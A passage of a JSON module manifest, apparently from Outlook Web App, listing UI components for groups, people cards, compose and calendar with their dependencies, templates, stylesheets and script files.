es":[{"name":"microsoft.owa.unifiedgroupcreation.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["unifiedgroupcreation"]},"unifiedgroupheader":{"Dependencies":["moderngroupsnavigation","react"],"Types":["_mgn.F"],"Templates":["UnifiedGroupReactHeaderView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.unifiedgroupheader.mouse.css","type":"Themed"}],"Configurations":[{"type":"UnifiedGroupHeaderComponent"}],"Sources":[{"name":"microsoft.owa.unifiedgroupheader.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["unifiedgroupheader"]},"moderngroupsnavigation":{"Dependencies":["moderngroupsshared","moderngroupscalendarshared","moderngroupssearchshared","nonbootwebservices","personacontrol","deferredboot","lightning"],"Types":["_y.ek","_xz.b","_y.cn","_y.eW","_mgn.bh","_mgn.p","_mgn.ba","_mgn.bf","_mgn.bl","_xs.g"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupsnavigation.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsNavigationComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupsnavigation.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.mgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupsnavigation"]},"groupsdiscovery":{"Dependencies":["moderngroupspeople","moderngroupsnavigation","peoplehub"],"Types":["_y.dL"],"Templates":["GroupsDiscoveryView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.groupsdiscovery.mouse.css","type":"Themed"}],"Configurations":[{"type":"GroupsDiscoveryComponent"}],"Sources":[{"name":"microsoft.owa.groupsdiscovery.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["groupsdiscovery"]},"groupshub":{"Dependencies":["moderngroupsnavigation","react"],"Types":["_mgn.D"],"Templates":["GroupsHubView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.groupshub.mouse.css","type":"Themed"}],"Configurations":[{"type":"GroupsHubComponent"}],"Sources":[{"name":"microsoft.owa.groupshub.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["groupshub"]},"navigation":{"Dependencies":["deferredboot","nonbootwebservices","calendarcore"],"Types":["_y.ct","_cc.bK","_nav.c"],"Templates":[],"Styles":[],"Configurations":[{"type":"NavigationViewModelsComponent"},{"type":"NavigationViewsComponent"}],"Sources":[{"name":"microsoft.owa.navigation.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nav.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["navigation"]},"moderngroupsheader":{"Dependencies":["boot","deferredboot","deferredwebservices","lightning","moderngroupsnavigation","moderngroupsshared","nonbootwebservices","peoplecore","personacontrol","readingpaneshared","readpersoncard"],"Types":["_y.eU","_xs.k","_xs.q","_xs.o"],"Templates":[],"Styles":[{"layout":"Mouse","name":"mgsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.moderngroupsheader.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsHeaderComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupsheader.js"},{"name":"microsoft.owa.moderngroupsheader.groupheaderredesign.js"},{"name":"microsoft.owa.moderngroupsheader.groupheaderv3.js"},{"name":"color-thief.min.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.mgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupsheader"]},"moderngroupsshared":{"Dependencies":["deferredboot","calendarwebservices","moderngroupssearchshared","nonbootwebservices"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"ModernGroupsSharedComponent"}],"Sources":[{"name":"microsoft.owa.moderngroups.shared.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["moderngroupsshared"]},"moderngroupscalendarshared":{"Dependencies":["deferredboot","calendarwebservices"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"ModernGroupsCalendarSharedComponent"}],"Sources":[{"name":"microsoft.owa.moderngroups.calendar.shared.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["moderngroupscalendarshared"]},"moderngroupssearchshared":{"Dependencies":["deferredboot","nonbootwebservices","lightning"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"ModernGroupsSearchSharedComponent"}],"Sources":[{"name":"microsoft.owa.moderngroups.search.shared.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["moderngroupssearchshared"]},"moderngroupscore":{"Dependencies":["boot","deferredboot","deferredwebservices","mailcommon","moderngroupsheader","moderngroupsnavigation","modernreadingpane","moderngroupsshared","nonbootwebservices","peoplecore","readingpaneshared","moderngroupssearchshared"],"Types":["_xs.m","_mgn.Y","_y.eT"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupscore.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsCoreComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupscore.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupscore"]},"moderngroupssearchcore":{"Dependencies":["boot","instantsearch","moderngroupsshared","nonbootwebservices","readingpaneshared","modernbootreadingpane","moderngroupssearchshared","moderngroupsnavigation"],"Types":["_xs.n","_xt.d","_y.gt","_xt.e"],"Templates":["GroupSearchResultsInInboxTemplate"],"Styles":[],"Configurations":[{"type":"ModernGroupsSearchCoreComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupssearchcore.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["moderngroupssearchcore"]},"moderngroupssearch":{"Dependencies":["boot","deferredboot","moderngroupsshared","moderngroupsnavigation","moderngroupssearchshared","nonbootwebservices"],"Types":["_xs.p","_xs.c"],"Templates":["GroupSearchRefinerView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupssearch.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsSearchComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupssearch.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.mgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupssearch"]},"moderngroupsinboxgroupsearchrefiners":{"Dependencies":["boot","deferredboot","instantsearch","lightning","moderngroupssearchshared","moderngroupsnavigation"],"Types":["_xt.f"],"Templates":["GroupsScopeRefinerView","GroupsScopeSearchRefinerCategoryView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroups.inboxgroupsearchrefiners.mouse.css","type":"Themed"}],"Configurations":[{"type":"InboxGroupSearchRefinersComponent"}],"Sources":[{"name":"microsoft.owa.moderngroups.inboxgroupsearchrefiners.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupsinboxgroupsearchrefiners"]},"moderngroupscompose":{"Dependencies":["boot","commoncompose","editor","findpeople","lightning","mailcommon","mailcompose","moderngroupscore","modernreadingpane","moderngroupsshared","personacontrol","quickcompose","recipientwell"],"Types":["_db.dZ","_y.dK","_y.ib","_y.eg","_y.eV"],"Templates":["GroupInlineComposeView","GroupFullComposeView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupscompose.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsComposeComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupscompose.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupscompose"]},"moderngroupsconversation":{"Dependencies":["boot","deferredboot","deferredwebservices","lightning","moderngroupscompose","moderngroupscore","moderngroupsheader","moderngroupsnavigation","moderngroupsshared","modernreadingpane","nonbootwebservices","peoplecore","personacontrol","readingpaneshared","moderngroupssearchshared"],"Types":["_y.jv","_mgn.B","_y.fd","_lt.j","_xm.j"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupsconversation.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsConversationComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupsconversation.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.mgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupsconversation"]},"moderngroupspeople":{"Dependencies":["boot","calendarcontrols","calendarcore","deferredboot","moderngroupscompose","moderngroupscore","moderngroupsheader","moderngroupsnavigation","moderngroupsshared","nonbootwebservices","peoplecore","peoplehub","personacardfacade","personacontrol","readpersoncard"],"Types":["_y.iv","_y.id"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupspeople.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupsPeopleComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupspeople.js"},{"layout":"Mouse","name":"microsoft.owa.moderngroupspeople.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.mgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["moderngroupspeople"]},"moderngroupcard":{"Dependencies":["deferredboot","nonbootwebservices","nonboot","moderngroupspeople","moderngroupsshared","recipientwell","personacontrol","readpersoncard","groupcard","lightning"],"Types":["_db.S","_pc.m","_xs.s"],"Templates":["UnifiedGroupSettingsCardView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.moderngroupcard.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernGroupCardComponent"}],"Sources":[{"name":"microsoft.owa.moderngroupcard.js"},{"layout":"Mouse","name":"microsoft.owa.moderngroupcard.mouse.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["moderngroupcard"]},"readpersoncard":{"Dependencies":["boot","deferredboot","nonbootwebservices","peoplecore","commoncompose","personacontrol","findpeople"],"Types":["_db.cr","_pe.q"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.people.personcard.mouse.css","type":"Themed"}],"Configurations":[{"type":"ReadPersonCardComponent"}],"Sources":[{"name":"microsoft.owa.people.personcard.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.personcardstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["readpersoncard"]},"peoplewebservices":{"Dependencies":["calendarcore","calendarwebservices","deferredwebservices","findpeople","instantsearch"],"Types":["_pc.p","_pc.k"],"Templates":[],"Styles":[],"Configurations":[{"type":"PeopleWebServicesComponent"}],"Sources":[{"name":"microsoft.owa.people.webservices.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["peoplewebservices"]},"groupcard":{"Dependencies":["deferredboot","composepersonacard","findpeople","peoplehub","personacontrol","readpersoncard","recipientwell","personaprofile"],"Types":["_y.fV","_db.cP","_pf.r","_pf.s"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.people.groupcard.mouse.css","type":"Themed"}],"Configurations":[{"type":"GroupCardComponent"}],"Sources":[{"name":"microsoft.owa.people.groupcard.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["groupcard"]},"composepersonacard":{"Dependencies":["deferredboot","nonbootwebservices","readpersoncard","calendarcontrols","editor"],"Types":["_db.cO"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.people.composepersonacard.mouse.css","type":"Themed"}],"Configurations":[{"type":"ComposePersonaCardComponent"}],"Sources":[{"name":"microsoft.owa.people.composepersonacard.js"},{"layout":"Mouse","name":"microsoft.owa.people.composepersonacard.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.personcardstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.bootcommonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["composepersonacard"]},"quickcompose":{"Dependencies":["deferredboot","nonbootwebservices","recipientwell","personacontrol","commoncompose","editor","attachments"],"Types":["_y.gF","_y.ip"],"Templates":["QuickComposeViewWrapper","QuickReplyViewWrapper","InlineComposeViewWrapper","InlineComposeEmptyPlaceholderViewWrapper"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.quickcompose.mouse.css","type":"Themed"}],"Configurations":[{"type":"QuickComposeComponent"}],"Sources":[{"name":"microsoft.owa.core.quickcompose.js"},{"layout":"Mouse","name":"microsoft.owa.core.quickcompose.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["quickcompose"]},"simplecompose":{"Dependencies":["deferredboot","nonbootwebservices","recipientwell","commoncompose","mailcompose"],"Types":["_y.it"],"Templates":["MailSimpleComposeView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.simplecompose.mouse.css","type":"Themed"}],"Configurations":[{"type":"SimpleComposeComponent"}],"Sources":[{"name":"microsoft.owa.core.simplecompose.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["simplecompose"]},"modernbootreadingpane":{"Dependencies":["nonbootwebservices","quickcompose"],"Types":["_h.bH"],"Templates":[],"Styles":[],"Configurations":[{"type":"ModernBootReadingPaneComponent"}],"Sources":[{"name":"microsoft.owa.modernbootreadingpane.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["modernbootreadingpane"]},"smime":{"Dependencies":["deferredboot","nonbootwebservices","recipientwell","commoncompose"],"Types":["_db.A","_db.bo"],"Templates":["SenderSignatureView","SignatureDetailsView","SmimeInvalidRecipientsDialogView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.smime.mouse.css","type":"Themed"}],"Configurations":[{"type":"SmimeComponent"}],"Sources":[{"name":"microsoft.owa.core.smime.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["smime"]},"imagealbumviewer":{"Dependencies":["deferredboot","nonbootwebservices","attachments"],"Types":["_y.jU","_y.fX"],"Templates":["ImageAlbumView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.imagealbumviewer.mouse.css","type":"Themed"}],"Configurations":[{"type":"ImageAlbumViewerComponent"}],"Sources":[{"name":"microsoft.owa.core.imagealbumviewer.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["imagealbumviewer"]},"linkpreview":{"Dependencies":["deferredboot","nonbootwebservices","mailcommon"],"Types":["_b.cr","_b.I"],"Templates":[],"Styles":[],"Configurations":[{"type":"LinkPreviewComponent"}],"Sources":[{"name":"microsoft.owa.core.linkpreview.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["linkpreview"]},"imageloader":{"Dependencies":["boot"],"Types":["_y.cA","_y.gu","_y.cz"],"Templates":[],"Styles":[],"Configurations":[{"type":"ImageLoaderComponent"}],"Sources":[{"name":"microsoft.owa.core.imageloader.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["imageloader"]},"modernreadingpane":{"Dependencies":["moderngroupsshared","nonbootwebservices","quickcompose","recipientwell","personacontrol","readingpaneshared","deferredboot","modernbootreadingpane","hashtagsux","introductionPeek","moderngroupsnavigation"],"Types":["_h.da","_y.N","_y.el"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.modernreadingpane.mouse.css","type":"Themed"}],"Configurations":[{"type":"ModernReadingPaneComponent"}],"Sources":[{"name":"microsoft.owa.modernreadingpane.js"},{"layout":"Mouse","name":"microsoft.owa.modernreadingpane.mouse.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["modernreadingpane"]},"immanager":{"Dependencies":["deferredboot","nonbootwebservices","recipientwell","shellcore","shellplus","editor"],"Types":["_h.P","_h.fl","_h.cd","_h.cc","_h.bg","_h.cw","_y.fW","_a.fH"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.im.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"IMManagerComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.core.lyncintegration.js"},{"layout":"Mouse","name":"microsoft.owa.core.im.js"},{"layout":"Mouse","name":"microsoft.owa.core.immanager.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["immanager"]},"livepersonacard":{"Dependencies":["deferredboot","react"],"Types":[],"Templates":[],"Styles":[],"Configurations":[],"Sources":[{"name":"livepersonacard.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["livepersonacard"]},"personacontrol":{"Dependencies":["boot","deferredboot","nonbootwebservices","peoplecore","textboys"],"Types":["_bc.f"],"Templates":["PersonaViewWrapper.ReadOnlyRecipientPopup","PersonaViewWrapper.PresenceDisplayPicturePopup","PersonaViewWrapper.BasicDetailsPopup","PersonaViewWrapper.PersonaMenuItem","PersonaViewWrapper.PersonaContextMenuHeader","PersonaView.PersonaPhotoHeader"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.personacontrol.mouse.css","type":"Themed"}],"Configurations":[{"type":"PersonaControlComponent"}],"Sources":[{"name":"microsoft.owa.core.personacontrol.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.livepersonacard.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["personacontrol"]},"findpeople":{"Dependencies":["boot","deferredboot","nonbootwebservices","peoplecore","personacontrol"],"Types":["_bc.z","_h.bz","_y.cw","_y.cj","_y.dj","_pe.H"],"Templates":["FindRecipientView","FindRecipientResultViewWrapper","PeopleSuggesterViewWrapper","FindPeopleView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.findpeople.mouse.css","type":"Themed"}],"Configurations":[{"type":"FindPeopleComponent"}],"Sources":[{"name":"microsoft.owa.core.findpeople.js"},{"layout":"Mouse","name":"microsoft.owa.core.findpeople.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["findpeople"]},"personacardfacade":{"Dependencies":["deferredboot","nonbootwebservices","peoplecore","personacontrol","readpersoncard"],"Types":["_db.Z","_y.dP","_db.dj","_bc.q"],"Templates":["PersonaCardFacadeViewWrapper.PersonaView_Card"],"Styles":[],"Configurations":[{"type":"PersonaCardFacadeComponent"}],"Sources":[{"name":"microsoft.owa.core.personacardfacade.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["personacardfacade"]},"personaprofile":{"Dependencies":["personacardfacade","readpersoncard","findpeople","peoplewebservices"],"Types":["_pe.U","_pe.T","_pe.S"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.people.personaprofile.mouse.css","type":"Themed"}],"Configurations":[{"type":"PersonaProfileComponent"}],"Sources":[{"name":"microsoft.owa.people.personaprofile.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.ppstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["personaprofile"]},"personaprofiledeferred":{"Dependencies":["calendarcore","calendarmeetingforms","attachmentpreview","attachments","attachmentwell","personaprofile","instantsearch"],"Types":["_pf.m"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.people.personaprofiledeferred.mouse.css","type":"Themed"}],"Configurations":[{"type":"PersonaProfileDeferredComponent"}],"Sources":[{"name":"microsoft.owa.people.personaprofiledeferred.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.ppstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["personaprofiledeferred"]},"peoplehub":{"Dependencies":["deferredboot","nonbootwebservices","peoplecore","personacontrol","personacardfacade","recipientwell","findpeople","contactmanagement","optionscoremodels","composepersonacard","peoplewebservices","instantsearch"],"Types":["_y.iz","_y.cv","_y.dA"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.peoplehub.mouse.css","type":"Themed"}],"Configurations":[{"type":"PeopleHubComponent"}],"Sources":[{"name":"microsoft.owa.core.peoplehub.js"},{"layout":"Mouse","name":"microsoft.owa.core.peoplehub.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.pcstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["peoplehub"]},"publicfolderfeaturesupport":{"Dependencies":[],"Types":["_h.dY"],"Templates":[],"Styles":[],"Configurations":[{"type":"PublicFolderFeatureSupportComponent"}],"Sources":[{"name":"microsoft.owa.core.publicfolderfeaturesupport.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["publicfolderfeaturesupport"]},"publicfolderpicker":{"Dependencies":["boot","nonbootwebservices","deferredboot"],"Types":["_h.dZ"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.publicfolderpicker.mouse.css","type":"Themed"}],"Configurations":[{"type":"PublicFolderPickerComponent"}],"Sources":[{"name":"microsoft.owa.core.publicfolderpicker.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.pfpickerstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["publicfolderpicker"]},"showinimmersivereader":{"Dependencies":["nonbootwebservices"],"Types":["_bc.L"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.showinimmersivereader.mouse.css","type":"Themed"}],"Configurations":[{"type":"ShowInImmersiveReaderComponent"}],"Sources":[{"name":"microsoft.owa.core.showinimmersivereader.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["showinimmersivereader"]},"mecard":{"Dependencies":["deferredboot","nonbootwebservices","personacontrol"],"Types":["_y.iu"],"Templates":["MeCardHeaderView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.mecard.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"MeCardComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.core.mecard.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["mecard"]},"suitemecard":{"Dependencies":["nonbootwebservices","shellplus"],"Types":["_y.fL"],"Templates":["MeCardMouseView"],"Styles":[],"Configurations":[{"layout":"Mouse","type":"O365SuiteMeCardComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.o365.shellg2.mecard.owa.js"},{"layout":"Mouse","name":"microsoft.owa.suitemecard.o365.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["suitemecard"]},"suitesettings":{"Dependencies":["shellplus"],"Types":["_y.hl"],"Templates":[],"Styles":[],"Configurations":[{"type":"O365SettingsComponent"}],"Sources":[{"name":"cardmetadata.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.o365.shellg2.settingstrings.localized.min.js"},{"name":"settingssearchclassifier.js"}],"PackagedStrings":[],"IncludedSlabs":["suitesettings"]},"calendarcore":{"Dependencies":["boot","calendarwebservices","commoncompose","deferredboot","peoplecore","calendarcontrols","mailcommon","moderngroupscalendarshared"],"Types":["_y.jg","_xz.c","_cc.eG","_y.fR","_db.g","_db.bU","_mco.y","_db.X","_y.dx","_dg.co","_dg.h","_db.cM","_bc.P","_y.hs","_y.gh"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.core.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarCoreComponent"}],"Sources":[{"name":"microsoft.owa.calendar.core.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calcorestrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.meetingmsgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarcore"]},"calendartheming":{"Dependencies":["boot","deferredboot","calendarcore"],"Types":["_cc.h"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.theming.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarThemingComponent"}],"Sources":[{"name":"microsoft.owa.calendar.theming.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.calendar.theming.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendartheming"]},"calendarmeetingforms":{"Dependencies":["boot","calendarcore","deferredboot","recipientwell","peoplecore","personacontrol","findpeople","mailcommon","calendarcontrols","locationwell","calendarwebservices","addroom","readingpaneshared","lightning"],"Types":["_y.ji"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.meetingforms.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarMeetingFormsComponent"}],"Sources":[{"name":"microsoft.owa.calendar.meetingforms.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calmfstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarmeetingforms"]},"calendarcontrols":{"Dependencies":["boot"],"Types":[],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.controls.v2.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarControlsCoreComponent"},{"layout":"Mouse","type":"CalendarControlsComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.controls.core.js"},{"layout":"Mouse","name":"microsoft.owa.calendar.controls.v2.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calcorestrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarcontrols"]},"calendarreactcontrols":{"Dependencies":["react","calendarcontrols","mailcommon"],"Types":["_mco.Y"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.reactcontrols.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarReactControlsComponent"}],"Sources":[{"name":"microsoft.owa.calendar.reactcontrols.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["calendarreactcontrols"]},"calendarpicker":{"Dependencies":["calendarsurface","personacontrol","deferredboot"],"Types":["_cc.bc","_cc.cC","_cc.bU"],"Templates":["CalendarPickerViewWrapper"],"Styles":[{"layout":"Mouse","name":"cpsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"calendarpicker.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarPickerComponent"}],"Sources":[{"name":"microsoft.owa.calendar.calendarpicker.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calpickerstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarpicker"]},"calendarsurface":{"Dependencies":["boot","deferredboot","calendarwebservices","calendarcore","calendarcontrols","personacontrol","lightning"],"Types":["_y.gn","_cb.cp","_y.hu","_y.ht"],"Templates":[],"Styles":[{"layout":"Mouse","name":"calendarsurface.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSurfaceCoreComponent"},{"layout":"Mouse","type":"CalendarSurfaceDesktopComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.surface.core.js"},{"name":"microsoft.owa.calendar.surface.core.mouse.js"},{"layout":"Mouse","name":"microsoft.owa.calendar.surface.v2.desktop.js"